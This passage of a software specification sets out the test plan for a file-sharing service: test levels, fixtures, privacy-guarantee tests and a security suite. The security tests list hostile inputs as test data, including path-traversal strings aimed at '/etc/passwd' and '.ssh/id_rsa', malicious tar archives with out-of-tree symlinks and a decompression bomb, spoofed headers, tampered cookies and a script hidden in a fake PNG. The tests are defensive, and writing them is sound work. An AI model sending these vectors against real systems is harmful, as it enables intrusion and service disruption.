# Part 14 — Test Plan and Acceptance Criteria

## 14.1 Philosophy and levels

This part is the contract between the specification and the implementation. A feature is not
finished when it works; it is finished when the tests named here for it exist, run in CI, and
pass. Where a test in this part contradicts prose elsewhere in the spec, **the test wins for
implementation purposes** and the discrepancy is recorded per §1.9 — the ones already found
while writing this part are in §14.24.

Every test ID in this part is referenced from somewhere else in the spec or is reachable from
one that is. Part 1 cites `T-PRIV-01…09` (§1.6.3), Part 4 cites `T-SEC-07` (§4.7), Part 6 cites
`T-PRIV-01` (§6.5.2), and Part 7 cites `T-EXP-02` (§7.5). Those citations are load-bearing and
the IDs below match them exactly.

### 14.1.1 The four levels

| Level | Runs against | Belongs here | Budget |
| --- | --- | --- | --- |
| **Unit** | Pure functions, no I/O | Path normalisation (§6.4), name validation and generation (§5.3), duration parsing, content-type derivation (§6.6.3), manifest diffing (§8.2), entry-path resolution (§5.5), longest-prefix candidate enumeration (§6.5.1), rate-limit bucket arithmetic (§10.2), `can_view` (§6.5), cache-control computation (§6.6.5), cookie-name derivation (§4.7) | < 10 ms |
| **Integration** | Real Postgres, real Redis, real file root; the API called in-process over an ASGI transport | Every endpoint, every error code in Parts 4–10, transactions, reference counting, worker jobs, idempotency, audit writes, quota accounting | < 2 s |
| **End-to-end** | Real Caddy over a real UNIX socket in front of a real API, real TLS against a local CA | Anything where Caddy's behaviour is load-bearing: `X-Share-*` stripping, `forward_auth`, `copy_headers`, `file_server`, `precompressed`, `Range`, the constant security headers, gate and error pages | < 10 s |
| **`@security`** | The integration or e2e harness, marked | Traversal, spoofing, enumeration and timing oracles, CSRF, credential-class confusion, quarantine, signature tampering, WebAuthn abuse | any |

`@security` is a **marker, not a stack**. A security test may run at any of the three levels.
The marker exists so CI can enforce §14.22.4 — a failing security test blocks a merge
unconditionally, and an unrun one counts as failing.

### 14.1.2 What may never be mocked

- **PostgreSQL.** Partial unique indexes (`artifact (user_id, name) WHERE deleted_at IS NULL`),
  the `expiry_required` check on `share_link`, the `one_root_user` index, `ON CONFLICT`
  semantics on `file`, and the `INSERT, SELECT`-only grant on `audit_event` are part of the
  correctness argument (§3.3, §3.4, §3.7, §3.8). A repository double proves nothing about them.
- **Redis.** Token-bucket refill, TTL expiry, stream semantics, HyperLogLog cardinality, and the
  `DEL`-on-revocation contract (§2.4.2) are behaviours, not interfaces. `fakeredis` is banned by
  a lint rule.
- **The filesystem's atomic-rename boundary.** The write protocol in §3.5 — stream to
  `SHARE_TMP_ROOT`, hash incrementally, `fsync`, `rename()` into `SHARE_FILE_ROOT`, `fsync` the
  directory — is the whole durability and partial-read argument. A `tmpfs` mount is acceptable;
  an in-memory filesystem abstraction is not, because it cannot fail a cross-device rename.
- **argon2.** Real argon2id at the real parameters (`m=64MiB, t=3, p=1`) for share-link
  passwords and recovery codes (§7.3, §4.5). A stubbed KDF hides a parameter misconfiguration
  that only appears in production, and it hides the timing profile that §14.5 measures.
- **WebAuthn verification.** The real `webauthn` library performing real signature, challenge,
  origin, RP ID, and counter checks (§4.3). Tests drive it with a software authenticator
  (§14.2.7), never by patching the verifier's return value.
- **Caddy**, for anything at e2e level. Header stripping (§2.4), `copy_headers`, `Range`
  handling, and `precompressed` are Caddy behaviours the API depends on and cannot self-test.

Acceptable to fake: SMTP (a sink, §14.2.6), the clock (§14.2.4), ULID and token generation
(§14.2.5), and the headless browser used for the SVG and framing assertions.

### 14.1.3 The negative-case rule

**Every endpoint in Parts 4–10 carries three mandatory negative tests.** Not "where
applicable" — three, for all of them.

1. **Permission denial.** The endpoint called with a credential that authenticates but does not
   authorise: a token missing the required scope, a session belonging to another user, a
   recipient session, a token whose owner is disabled, an artifact name in another space.
   Asserts the exact status and the exact `code` from that endpoint's error table (§5.12, §6.8,
   §7.10, §8.9, §4.9, §10.9) — never merely "4xx".
2. **Limit breach.** The endpoint driven past whichever ceiling applies: a rate-limit bucket
   from §10.2, a storage quota from §10.3, a body ceiling from §5.1.4, or a count ceiling
   (files per version, tags per artifact, archive entries, concurrent uploads). Asserts the
   status, the `code`, `detail.bucket` for `429 rate_limited`, the presence of `Retry-After`,
   `X-RateLimit-Limit`, `X-RateLimit-Remaining`, and `X-RateLimit-Reset` on every `429`, and
   `detail.currentBytes` / `projectedBytes` / `quotaBytes` on every `413 quota_exceeded`.
3. **Malformed input.** A body or query violating the schema: wrong JSON type, missing required
   field, unknown field, over-length string, invalid enum, an unparseable duration, and — for
   anything path-shaped — a traversal attempt. Asserts `422` with
   `detail.fields[].path` / `.code` per §5.1.1.

Enforcement is itself a test, not a review convention:

**T-SEC-00 — negative-coverage reflection.** *Unit.* Import the FastAPI application, walk
`app.routes`, and build the set of `(method, path_format)` pairs excluding `/internal/health`,
`/internal/ready`, and `OPTIONS`/`HEAD` auto-routes. Walk the collected test suite and read the
`@covers(method, path, kind)` decorator on every test. Assert that for each route all three
`kind` values (`permission`, `limit`, `malformed`) appear at least once. **Fails the build with
a list of uncovered `(route, kind)` pairs.** A route that genuinely cannot breach a limit — the
health probes are the only ones expected — must be added to an explicit `NO_LIMIT_ROUTES` list
in the test file with a one-line justification, and the test asserts that list is non-growing
relative to a checked-in count.

### 14.1.4 Assertion style

Assertions name exact values. `assert r.status_code == 404 and r.json()["error"]["code"] ==
"not_found"`, not `assert not r.ok`. Byte-identity assertions compare `r.content` and the full
sorted header list minus `Date`. Timing assertions state sample size, statistic, and threshold.
Nothing in this part is satisfied by "check it works".

## 14.2 Test environment

### 14.2.1 Standing up an instance

A session-scoped fixture brings up, per worker process:

- **PostgreSQL 16**, a fresh database per xdist worker (`share_test_gw0`, …), `citext` and
  `pg_trgm` created, migrated to head with Alembic. Each test runs inside a transaction rolled
  back at teardown, except tests marked `@commit_required` (worker jobs, `LISTEN`-free
  cross-connection visibility, `FOR UPDATE SKIP LOCKED` collection), which get a truncate-based
  reset instead.
- **Redis 7**, a dedicated numbered database per worker, `FLUSHDB` between tests.
- **An ephemeral file root.** `SHARE_FILE_ROOT=$TMP/files`, `SHARE_TMP_ROOT=$TMP/tmp`,
  `$TMP/quarantine`. **At session start the fixture asserts
  `os.stat(file_root).st_dev == os.stat(tmp_root).st_dev` and aborts the entire session with a
  named error if they differ** — a cross-device tmp root turns every `rename()` into a copy and
  silently invalidates the atomicity argument in §3.5. It also asserts the root is writable by
  the test user and that the mode of a written blob is `0640`.
- **Caddy 2.8+**, for `@e2e` only: the §2.4 Caddyfile with `share.c52.com` replaced by
  `share.test`, `tls internal`, and the socket path pointed at the harness. `share.test`
  resolves through the client's own resolver override, not `/etc/hosts`. The e2e client trusts
  Caddy's internal CA and nothing else.

### 14.2.2 Environment under test

Ceilings are lowered so limits are reachable in a test, and every test that depends on a
ceiling reads it from settings rather than hard-coding the number:

| Variable | Test value | Why |
| --- | --- | --- |
| `SHARE_HOST` | `share.test` | Also the WebAuthn RP ID |
| `SHARE_MAX_FILE_BYTES` | `10485760` (10 MB) | Reachable without moving gigabytes |
| `SHARE_MAX_ARTIFACT_BYTES` | `52428800` (50 MB) | |
| `SHARE_MAX_FILES_PER_VERSION` | `5000` | **Not lowered** — the 5,000-file case is a real target (§14.20) |
| `SHARE_USER_QUOTA_BYTES` | `104857600` (100 MB) | Quota breach in three posts |
| `SHARE_DEFAULT_SHARE_TTL` | `14d` | Production value; expiry tests move the clock |
| `SHARE_MAX_SHARE_TTL` | `180d` | Production value |
| `SHARE_TRASH_DAYS` | `30` | Production value |

A dedicated test asserts that no other production default is overridden: **T-OPS-12** diffs the
test `Settings` object against `Settings()` defaults and fails on any key not in the table
above. A test suite that quietly weakens a production ceiling proves the wrong system.

### 14.2.3 Deterministic IDs and tokens

`share.ids.new_id(prefix)` and `share.crypto.token_bytes(n)` are the only two generators, and
both read from a `Randomness` provider resolved at call time. In tests the provider is seeded
per test with the test's node ID, so:

- ULIDs are reproducible and still monotonic within a test, keeping cursor pagination
  assertions exact.
- Share tokens, API tokens, session tokens, recovery codes, upload-session signatures, and
  generated names are all reproducible, so a test can assert a literal URL.
- A `@real_entropy` marker restores the CSPRNG for the two tests that measure entropy itself
  (T-SEC-19, T-SHARE-04).

A lint rule bans `secrets.`, `random.`, `os.urandom`, and `uuid.` outside `share/crypto.py` and
`share/ids.py`.

### 14.2.4 The injected clock

All time reads go through `share.clock.now()` and `share.clock.monotonic()`. **A lint rule
(`flake8-share-clock`) fails the build on any direct `datetime.now`, `datetime.utcnow`,
`time.time`, `time.monotonic`, or `date.today` outside `share/clock.py`**, including in tests.
SQL is covered separately: a second lint rule bans `now()` and `CURRENT_TIMESTAMP` in
application SQL and in migrations that write data, requiring a bound parameter instead — except
in `DEFAULT` clauses, which are exercised only by tests that do not depend on the value.

The fixture `clock` offers `set(instant)`, `advance(delta)`, and `freeze()`. Postgres is kept in
step by `SET LOCAL share.now = …` read by a session-scoped `share_now()` SQL function that the
expiry sweeps use, so a moved clock moves both sides. Tests that assert "the sweep has not run"
(T-EXP-02) advance the clock **without** running the worker, which is only sound because the
worker is invoked explicitly in tests, never by a background scheduler.

### 14.2.5 Fixed secrets

`secret_key` and `view_salt` are fixed 32-byte test values, so a signed upload URL, a recipient
cookie MAC, and a daily view hash are all reproducible across runs and can be asserted
literally. T-PRIV-06 depends on the salt being *derived per day from* `view_salt`, not equal to
it, and asserts the derivation changes at the UTC day boundary.

### 14.2.6 SMTP sink

An in-process SMTP sink captures every outbound message. Assertions key on the
`X-Share-Template` header the mailer sets from the §12.9 template name (`link_created`,
`link_ending`, `link_ended`, `quota_warning`, `recovery_used`, `counter_regressed`,
`token_created`, `first_link_by_token`, `anomaly_link_rate`, `anomaly_trash_rate`,
`backup_failed`, `disk_high`, `invite`, `artifact_ttl_ending`) — never on subject-line text,
which is Part 12's to change. The sink exposes `sink.of("link_created")` returning parsed
messages with headers, recipients, and both bodies. A test asserting an email was sent also
asserts **no other** template fired, so a notification storm is a failure.

### 14.2.7 WebAuthn test authenticator

A software authenticator (`softwebauthn` or equivalent) with a real P-256 key pair performs
real attestation and assertion. It supports, as first-class controls: replaying a consumed
challenge, signing with the wrong origin, signing with the wrong RP ID hash, holding the
signature counter flat, decrementing it, cloning itself into a second instance with the same
credential ID, and producing a malformed CBOR attestation. **Passkey ceremonies are therefore
exercised for real end to end**; no test asserts sign-in by inserting a `session` row.

### 14.2.8 Fixtures

**Users.**

| Fixture | Handle | Role |
| --- | --- | --- |
| `root_user` | `robert` | `is_root = true`, holds the bare namespace, two passkeys, one recovery code |
| `user_b` | `sarah` | Ordinary user, one passkey |
| `user_c` | `mallory` | Ordinary user, the adversary in cross-space tests |

Each has a live session fixture and a matching `share_csrf` pair.

**Tokens.** For `root_user`, one token per element of the powerset of
{`artifacts:read`, `artifacts:write`, `artifacts:delete`, `share:create`, `account:read`,
`account:admin`} that is reachable in the product, plus these named ones used by most tests:

| Fixture | Scopes |
| --- | --- |
| `tok_agent` | `artifacts:read`, `artifacts:write` — **the agent default** (§4.6.1) |
| `tok_ro` | `artifacts:read` |
| `tok_sharer` | `artifacts:read`, `artifacts:write`, `share:create` |
| `tok_deleter` | `artifacts:read`, `artifacts:write`, `artifacts:delete` |
| `tok_admin` | all six |
| `tok_revoked` | `artifacts:read`, `artifacts:write`; `revoked_at` set |
| `tok_expired` | as above; `expires_at` in the past |
| `tok_disabled_owner` | valid token whose user has `disabled_at` set |
| `tok_b_agent` | `user_b`'s agent-default token |

The full powerset is generated, not hand-written, and `T-AUTH-09` parameterises over it.

**Artifacts**, one per `kind` (§3.4): `bundle` (4 files, entry `/index.html`), `page` (one
HTML file), `document` (one PDF), `image` (one PNG), `video` (a 12 MB MP4 with a real moov
atom, and a 2 GB sparse MP4 built only for the performance suite), `file` (one `.bin`).

**Sharing states**, one artifact in each, all owned by `root_user`:

`private` · `granted` (to `user_b`) · `link` (no password, 14 d) · `link_pw`
(password `civil-marmot-71`) · `link_expired` (`expires_at` one hour in the past, sweep **not**
run) · `link_revoked` (`revoked_at` set) · `trashed` (was link-shared before trashing) ·
`ttl_expired` (`ttl_expires_at` in the past, sweep not run) · `link_maxviews` (`max_views = 2`).

**Multi-version.** `versioned` at seq 5, where seq 1 and 5 share one file, seq 3 is pinned, and
seq 2 references a file no other version does (so collection has something to find).

**Bundles.** `bundle_entry` (has `/index.html`), `bundle_noentry` (three PDFs, no HTML — the
listing page, R7), `bundle_one_html` (one HTML file named `report.html`, exercising §5.5 rule 3),
`bundle_explicit` (explicit `entryPath: /app/start.html`), `bundle_bad_entry` (explicit
`entryPath` not present in the manifest).

### 14.2.9 Isolation

Tests are independent and may run in any order under `pytest -p xdist -n auto --random-order`.
CI runs the suite twice nightly with two different seeds; an order-dependent failure is a bug in
the test, fixed, never retried into green. Redis is flushed and the file root is emptied between
tests. Any test leaving a file in `SHARE_TMP_ROOT` fails in teardown — a leaked `.part` file is
how the write protocol breaks quietly.

## 14.3 Test ID scheme

`T-<AREA>-<NN>`, zero-padded, stable forever. An ID is never reused or renumbered; a retired
test keeps its ID with a `retired:` note so external citations do not rot.

| Area | Covers | Section |
| --- | --- | --- |
| `PRIV` | The nine guarantees P1–P9 | §14.4 |
| `SEC` | Cross-cutting security suite | §14.5 |
| `AUTH` | Passkeys, sessions, tokens, scopes, recovery, device flow | §14.6 |
| `POST` | Declare / upload / commit, bundle upload, naming, dedupe | §14.7 |
| `SERVE` | Resolution, file matching, content types, headers, ranges | §14.8 |
| `SHARE` | Links, passwords, grants, revocation, the visibility matrix | §14.9 |
| `EXP` | Every expiry: links, artifact TTL, sessions, invites, uploads | §14.10 |
| `VER` | Versions, restore, pinning, retention, reference counts | §14.11 |
| `TRASH` | Trash, restore, purge, hard delete | §14.12 |
| `SEARCH` | Metadata search, filters, ranking, scoping | §14.13 |
| `LIMIT` | Rate limits, quotas, size and count ceilings | §14.14 |
| `AUDIT` | Audit events, view rollups, notifications | §14.15 |
| `MCP` | The remote MCP endpoint and its tools | §14.16 |
| `CLI` | The `share` binary | §14.17 |
| `OPS` | Install, backup, restore, collection, `sharectl` | §14.18 |

Every case below states: **level**, **preconditions**, **steps**, **expected result**, and the
**spec section** it verifies.

## 14.4 T-PRIV — the nine privacy guarantees

These nine map one-to-one onto P1–P9 in §1.6.3 and are cited there by ID. They are the release
gate: none may be skipped, quarantined, or marked `xfail` in any branch, ever.

**T-PRIV-01 — an inaccessible artifact is indistinguishable from one that never existed.**
*e2e, `@security`. Verifies P1, §6.5.2, §6.8.*
- **Pre:** `private` exists at `/private-thing` in the root space. `/never-used-name` has never
  existed. No cookies, no `Authorization`. Redis warm for both paths (each requested twice
  before measurement so negative resolution is cached per §6.5.2).
- **Steps:** (a) `GET /private-thing` and `GET /never-used-name`, unauthenticated, capture full
  response. (b) Repeat each 1,000 times, interleaved A/B/A/B to cancel drift, recording
  wall-clock per request. (c) Repeat (a) with `FLUSHDB` before each request to measure the cold
  path. (d) Repeat with a valid session belonging to `user_c` (a signed-in stranger).
- **Expect:** status `404` for all. `r.content` byte-identical between the two paths. Header
  sets identical after removing `Date` — in particular neither carries `X-Share-Artifact`,
  `X-Share-Version`, `ETag`, `Last-Modified`, or a differing `Cache-Control` (both `no-store`).
  Body contains `"code": "not_found"` and nothing naming the artifact. **Median wall-clock
  difference < 2 ms and p99 difference < 10 ms over the 1,000 warm pairs**; the same thresholds
  over 200 cold pairs. Identical results for the signed-in stranger. Also assert the
  `Content-Length` values are equal, since a length difference is a timing-free oracle.

**T-PRIV-02 — nothing is created, updated, or deleted without a credential.**
*Integration, `@security`. Verifies P2, §1.5, §5.2.*
- **Pre:** Route table from `app.routes`.
- **Steps:** Enumerate every route whose method is `POST`, `PUT`, `PATCH`, or `DELETE`,
  excluding `/auth/*` ceremony endpoints, `/s/{token}/unlock`, and `/internal/*`. Call each with
  a well-formed body and (a) no credential, (b) `Authorization: Bearer shr_` + 43 random chars,
  (c) `Cookie: share_s=<random>`, (d) a valid recipient-session cookie. After the whole sweep,
  snapshot row counts for `artifact`, `artifact_version`, `version_file`, `file`, `share_link`,
  `share_grant`, `api_token`, `passkey_credential`, `app_user`, `invite`.
- **Expect:** every call is `401 invalid_token` / `401 session_expired` / `403
  wrong_credential_class` as the endpoint's table specifies — never 2xx, never `500`. Row counts
  after equal row counts before, exactly. `SHARE_FILE_ROOT` unchanged (recursive hash of the
  tree equal). An `auth.signin_failed`-class audit row exists for each attempt that parsed as a
  credential (§4.9).

**T-PRIV-03 — every share-link mutation is audited with the full record.**
*Integration. Verifies P3, §7.3, §10.7.*
- **Pre:** `tok_sharer`, artifact `postcal`.
- **Steps:** Create a link with a password and a 14 d TTL; `PATCH` it to extend to 21 d; `PATCH`
  it to change the password; `DELETE` it. Then let a link expire and run the sweep.
- **Expect:** five `audit_event` rows — `link.create`, `link.update`, `link.password_change`,
  `link.revoke`, `link.expired`. Each carries `actor_type` (`token` for the first four, `system`
  for the last), `actor_token_id = tok_sharer.id`, non-null `ip`, `target_type='share_link'`,
  `target_id`, and `target_label` naming the artifact. `link.create.metadata` matches §10.7
  exactly: `artifact`, `artifactId`, `expiresAt`, `ttl`, `hasPassword: true`, `label`, `url`,
  `maxViews`. Assert `metadata` contains **no** password, no plaintext token beyond the `url`
  field that is the link itself, and that `hasPassword` is a boolean not a hash.

**T-PRIV-04 — no share link is permanent.** *Integration + unit, `@security`. Verifies P4, §7.1,
§2.7, §3.7.*
- **Steps:** (a) `POST /links` with `ttl: null`, `ttl: ""`, `ttl: "never"`, `ttl: "0"`,
  `ttl: "9999d"`, `ttl: "-1d"`, `expiresAt: null`, and an unknown field `permanent: true`.
  (b) Attempt `UPDATE share_link SET expires_at = NULL` directly in SQL. (c) Grep the settings
  schema and the Caddyfile for any key matching `permanent|forever|no_expiry|never_expires`.
  (d) Create 200 links with random valid TTLs.
- **Expect:** (a) `ttl: null` and absent both apply `SHARE_DEFAULT_SHARE_TTL`, never null;
  `"never"`/`"0"`/`"-1d"` are `422 invalid_ttl`; `"9999d"` is `422 ttl_too_long`; the unknown
  field is `422`. (b) the raw `UPDATE` raises a `CheckViolation` on `expiry_required`.
  (c) no such setting exists — the test fails the build if one is added, which is what §2.7's
  "no configuration escape hatch" means operationally. (d) all 200 rows have
  `expires_at IS NOT NULL` and `expires_at <= created_at + SHARE_MAX_SHARE_TTL`.

**T-PRIV-05 — artifact bytes are never read for any inference.** *Integration + static,
`@security`. Verifies P5, §8.7, §6.6.4, §3.4.*
- **Pre:** A PDF containing the phrase `xylophone-quarterly-borogove` and a title in its
  metadata; an HTML file whose `<title>` is `Secret Internal Title`; an MP4 with a duration and
  a poster frame.
- **Steps:** Post all three with **no** `title` supplied. Instrument `open()`,
  `pathlib.Path.read_bytes`, and the async file reader with a counting wrapper for the duration
  of declare, upload, commit, list, get, and search. Then `GET /api/v1/artifacts?q=xylophone`,
  `?q=borogove`, `?q=Secret Internal Title`.
- **Expect:** `artifact.title IS NULL` for all three — no title inferred from PDF metadata or
  `<title>`. `kind` is `document` / `page` / `video`, derived from manifest shape only. The read
  counter shows the upload path read each body exactly once (to hash it) and **zero** reads
  during commit, list, get, or search. All three searches return zero items. No `duration`,
  `width`, `height`, `pageCount`, or `poster` field exists anywhere in the artifact response
  schema — asserted against the OpenAPI document, so adding one fails this test.

**T-PRIV-06 — no full IP address is persisted for a view, and yesterday's hashes are
unrecomputable.** *Integration, `@security`. Verifies P6, §3.8, §10.6.*
- **Steps:** Serve 50 artifact requests from three distinct client addresses across two link
  sources. Flush the view buffer. Then (a) dump every table and assert no column holds any of
  the three addresses in any representation — text, `inet`, packed bytes, or reversed; (b)
  confirm `view_daily` is the only view storage and that no per-request row table exists in the
  schema; (c) recompute the day's hash for a known address with the day's derived salt and
  confirm it matches the HLL input; (d) advance the clock past 00:00 UTC and recompute — assert
  the derived salt differs and the resulting hash differs; (e) assert the same address hashed
  for two different artifacts on the same day yields **different** values (the derivation
  includes the artifact), so views are unlinkable across artifacts.
- **Expect:** all five hold. Note the deliberate exception: `session.ip`, `api_token.last_used_ip`,
  `recovery_code.used_ip`, and `audit_event.ip` **do** hold addresses; the test asserts P6 is
  scoped to *view* records and that `recipient_session.ip_hash` is a hash, never an address.

**T-PRIV-07 — no cross-space read, write, list, or enumeration without an explicit share.**
*Integration, `@security`. Verifies P7, §5.2, §6.5.*
- **Pre:** `user_b` owns `~sarah/deck` (private) and `~sarah/granted-to-c` (granted to
  `user_c`). `user_c` holds `tok_c_admin` with every scope, and a session.
- **Steps:** As `user_c`, for each of ~30 endpoints that take a `{name}` (read, files,
  files/content, versions, versions/{id}/files, activity, links, grants, PATCH, DELETE, restore,
  copy, POST links, POST grants, version restore, pin, …), call it against `~sarah/deck` by
  every addressing form the API accepts. Then `GET /api/v1/artifacts` with `owner=sarah`,
  `q=deck`, `shared=true`, `trashed=true`, every `sort`, and paginate to exhaustion. Then
  `GET /~sarah/deck` and `GET /~sarah/` and `GET /~sarah` over HTTP.
- **Expect:** every `{name}` call is `404 artifact_not_found` (not `403` — a `403` confirms
  existence). Every listing returns only `user_c`'s own artifacts plus `~sarah/granted-to-c`;
  `deck` never appears in `items`, in `nextCursor` positioning, or in a total count (there is no
  total count — asserted). `GET /~sarah/deck` is `404`; `GET /~sarah/` and `/~sarah` are `404`
  with the same body (P1 — there is no space listing, §6.6.2). Additionally: `copy` of
  `~sarah/granted-to-c` succeeds (§7.7.1) while `PATCH`/`DELETE`/`POST links` on it are
  `403 not_your_artifact`, proving a grant conveys read only.

**T-PRIV-08 — purge removes rows, dereferences files, and the next collection removes bytes.**
*Integration `@commit_required`. Verifies P8, §3.6, §8.4.*
- **Pre:** `tok_deleter`. Artifact `doomed` with 3 versions and 5 distinct files, one of which
  (`shared.css`) is also referenced by artifact `survivor`.
- **Steps:** Record `file.ref_count` for all five and the on-disk paths. `DELETE
  /api/v1/artifacts/doomed?purge=true`. Assert immediately. Advance the clock 25 hours. Run the
  collection job. Assert again. Run it a second time.
- **Expect:** immediately after purge — `artifact`, `artifact_version`, `version_file`, and
  `artifact_tag` rows for `doomed` are gone (hard, not `trashed_at`); `share_link` and
  `share_grant` rows cascade away; `ref_count` for the four exclusive files is `0` and for
  `shared.css` is decremented by 3 but still `> 0`; **the bytes are still on disk** (the 24 h
  grace, §3.6). After collection — the four blobs and their `.br`/`.gz` siblings are gone, empty
  shard directories are pruned, `file` rows are gone, `shared.css` is untouched and still
  served, `survivor` still renders. The second run is a no-op with an empty summary. An
  `artifact.purge` audit row exists with `actor_token_id`.

**T-PRIV-09 — revocation kills every recipient session on the next request.** *e2e,
`@security`. Verifies P9, §7.4, §3.7, §2.4.2.*
- **Pre:** `link_pw` on artifact `postcal`. Three separate browser contexts unlock it and each
  holds a live `share_r_*` cookie; each has fetched `/s/{t}/` and `/s/{t}/style.css` so the
  resolution, manifest, and token caches are warm.
- **Steps:** Three independent runs. (a) `DELETE /api/v1/links/{id}`. (b) `PATCH
  /api/v1/links/{id}` with a new password. (c) `DELETE /api/v1/artifacts/postcal` (trash). In
  each, immediately — **without advancing the clock, without flushing Redis, without restarting
  anything** — replay the three contexts' next request.
- **Expect:** (a) `410 link_expired` on `/s/{t}/` and `404` on `/s/{t}/style.css`; `SELECT count(*)
  FROM recipient_session WHERE share_link_id = … AND revoked_at IS NULL` is `0`. (b) `401
  recipient_auth_required`, and the *old* password fails at `/unlock` while the new one
  succeeds and mints a new session. (c) `410` on the entry page. In all three the Redis keys
  `sh:tok:{sha}` and `sh:sess:*` for those sessions are absent, proving the `DEL` was explicit
  rather than a TTL expiry. Repeat (a) with the clock frozen to prove no time-based path is
  involved.

## 14.5 T-SEC — the security suite

Every case here carries `@security`. §14.22.4 governs what a failure means.

### 14.5.1 Path traversal and normalisation

**T-SEC-01 — traversal in request paths.** *e2e.* Against `/postcal/…` as the owner, request
each of ~60 vectors: `../../../etc/passwd`, `..%2f..%2fetc/passwd`, `..%252f`, `%2e%2e/`,
`%2e%2e%2f`, `....//`, `..\..\`, `/postcal/./../../file`, `//etc/passwd`, `/postcal//style.css`,
a path with `%00`, a path with a raw NUL, `C:\windows\win.ini`, `\\?\C:\`, a 40-segment path, a
2 KB path, a path with `\u202e` (Cf category), an NFD-composed path whose NFC form exists, and
UTF-8 overlong encodings of `/` and `.`. **Expect:** every one is `404 not_found` with the
canonical body; none is `200`, `301`, `308`, or `500`. Assert via a filesystem watcher that no
`open()` occurred outside `SHARE_FILE_ROOT`. Assert the NFC case specifically: the NFD request
either resolves to the NFC file (per §6.4 step 4) or `404`s, but never escapes. Verifies §6.4.

**T-SEC-02 — traversal in declared manifests.** *Integration.* Declare artifacts whose
`files[].path` is each of: `../outside.txt`, `/../outside.txt`, `a/../../b`, `/a//b`, `/a/./b`,
`` (empty), `/`, `.`, `..`, `a/`, `/.git/config`, `/.env`, `/.ssh/id_rsa`, `/.well-known/x`,
`C:\x`, a 1,100-byte path, a 300-byte segment, a 33-segment path, a path containing `\x00`, a
path containing `\x1f`, and `/A.txt` alongside `/a.txt`. **Expect:** `422 invalid_path` for the
traversal and control-character cases; `422 dotfile_rejected` for `.git`, `.env`, `.ssh`;
**`201` for `/.well-known/x`** (the sole exception, §6.4 step 7); `422 path_case_collision` for
the last; `detail.fields[0].path` naming the offending index in every case. Zero rows written on
any rejection. Verifies §6.4, §5.12.

**T-SEC-03 — traversal and hostility in tar archives.** *Integration.* `POST
/api/v1/artifacts/bundle` with archives containing, one per case: an entry named `../x`, an
absolute `/etc/x`, a symlink to `/etc/passwd`, a symlink to `../`, a hardlink out of tree, a
device node, a FIFO, a directory entry with mode `0777` and a setuid bit, a 5,001-entry archive,
an entry declaring 800 MB of a 200 MB budget, a 10 KB gzip expanding to 2 GB (ratio 200,000:1), a
tar with a truncated final block, a tar with a PAX header overriding the path to `../x`, a tar
with a GNU long-name entry containing `..`, and a zip renamed to `.tar`. **Expect:**
`422 invalid_archive` for structural hostility, `422 archive_ratio_exceeded` for the bomb,
`413 too_many_files` for 5,001, `413 artifact_too_large` for over-budget expansion. In every
case: nothing extracted outside the temp dir (filesystem watcher), the temp dir removed at
teardown, zero `file` rows created, and the process peak RSS under 512 MB — a bomb must fail
*before* materialising. Verifies §5.6.

**T-SEC-04 — double encoding is always an attack.** *e2e.* Request `/postcal/%252e%252e%252f`,
`/postcal/%25 2e`, `/s/%252e%252e/x`, `/api/v1/artifacts/%252e%252e`, and a name declared as
`%2e%2e` at post time. **Expect:** all `404`/`422`; specifically, a path that percent-decodes
once to a string still containing a `%` sequence that would decode further is rejected outright
rather than decoded twice (§6.4 step 1). Assert with a probe artifact literally named
`a%2fb`-decoded (`a/b`) that single-decoding still works, so the rule does not over-reject.

### 14.5.2 Header spoofing and credential class

**T-SEC-05 — client-supplied `X-Share-*` headers are stripped.** *e2e.* Send
`GET /never-used-name` with `X-Share-File: ab/cd/<sha of a private blob>`,
`X-Share-Artifact: art_…`, `X-Share-Actor: usr_root`, `X-Share-Content-Type: text/html`,
`X-Share-CSP:`, `X-Share-Version: ver_…`, plus lowercase, mixed-case, underscore
(`X_Share_File`), duplicated, and continuation-folded variants. Also send them to `/api/v1/*`,
`/s/{token}`, and `/mcp`. **Expect:** `404` for the artifact path with no blob served — the
private blob's bytes never appear in any response body across the whole sweep. `/internal/authorize`
sees no `X-Share-*` request header (asserted by an in-process recorder). The API never trusts
`X-Share-Actor` for identity: a request carrying it and no cookie is anonymous. Verifies §2.4.
**Additionally** assert `X-Forwarded-For` from a non-loopback peer does not change the IP used
for rate limiting or audit, since `trusted_proxies` is loopback-only.

**T-SEC-06 — content-type confusion.** *e2e.* Post a bundle where `logo.png` contains
`<script>fetch('/api/v1/artifacts')</script>` and declares `contentType: text/html`; `x.svg`
declares `text/html`; `evil.html` declares `image/png`; `f.woff2` declares
`text/javascript`; `data.bin` declares nothing; `page.html` declares `text/html`. **Expect:**
`logo.png` is served `image/png` (extension wins, §6.6.3), `x.svg` as `image/svg+xml` with the
SVG CSP, `evil.html` as **`image/png`** — the declared type is honoured only where it does not
conflict with an image/video/font extension, and the coercion rule is asserted in both
directions with an explicit table in the test. `data.bin` is `application/octet-stream` with
`Content-Disposition: attachment`. `X-Content-Type-Options: nosniff` present on all. A headless
browser loading `/artifact/logo.png` executes nothing (a `window.__pwned` sentinel stays
undefined). Verifies §6.6.3.

**T-SEC-07 — a recipient credential authorises nothing but its own link.** *e2e.* **This is the
test cited by §4.7.**
- **Pre:** `link_pw` on `postcal` (link L1) and a second link L2 on artifact `other`. A
  recipient unlocks L1 and holds cookie `share_r_<L1 prefix>` with value
  `{rcp_id}.{HMAC}`. The raw share token for L1 is `T1`.
- **Steps:** Present the recipient cookie, and separately the raw token `T1` as
  `Authorization: Bearer T1`, as `Cookie: share_s=T1`, and as `?token=T1`, to: every
  `/api/v1/*` route (all methods), `/~/artifacts`, `/~/settings`, `/~/tokens`, `/mcp`
  (initialize and `tools/call share_list`), `/auth/passkey/login/begin`, and
  `/api/v1/artifacts/postcal/files/content?path=/index.html`. Then send the L1 recipient cookie
  to `/s/{T2}/` and to `/other` and `/~robert/other`. Then rename cookie `share_r_<L1>` to
  `share_r_<L2 prefix>` keeping the same value and send it to `/s/{T2}/`. Then take a valid L1
  cookie and tamper one byte of the HMAC, and separately swap in another session's `rcp_` id
  with L1's MAC.
- **Expect:** every `/api/v1/*` and `/~/*` call returns `403 wrong_credential_class` (or `401
  invalid_token` where the credential does not parse as `shr_`), never 2xx and never a partial
  body. `/mcp` returns a JSON-RPC error carrying `wrong_credential_class`. The L1 cookie at
  `/s/{T2}/` is treated as absent → `401 recipient_auth_required` for a password link or `404`
  for the artifact path, and **the browser never sends it at all**, asserted at e2e level by
  reading the request Caddy received: `Path=/s/{token}` scoping means no cross-link
  transmission (§4.7). The renamed cookie is rejected because the session row's
